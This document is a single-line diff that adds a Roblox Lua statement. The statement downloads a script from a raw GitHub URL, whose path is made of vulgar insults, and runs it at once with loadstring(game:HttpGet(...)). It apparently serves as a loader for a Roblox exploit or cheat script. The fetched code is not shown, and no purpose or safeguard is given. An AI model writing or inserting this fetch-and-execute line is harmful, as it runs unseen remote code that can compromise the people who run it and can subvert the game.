@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Blind-Man-Walking/YouCockEater/refs/heads/main/SuckYaMother"))()
